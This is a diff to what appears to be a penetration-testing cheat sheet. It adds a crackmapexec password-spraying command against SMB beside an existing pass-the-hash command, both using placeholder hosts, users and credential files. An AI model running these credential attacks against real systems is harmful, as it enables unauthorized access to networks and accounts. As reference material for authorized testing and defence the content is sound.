@@ -296,6 +296,12 @@ Pass-The-Hash :
 crackmapexec smb $HOST -u $USER -H $HASH
 ```
 
+Password spraying :  
+```
+crackmapexec smb $HOST -u $USER_FILE -p $PWD_FILE
+```
+With `$PWD_FILE` containing the list of passwords to test against the users listed in `$USER_FILE`.  
+
 - enum4linux
 
 Not actively maintained but still useful :
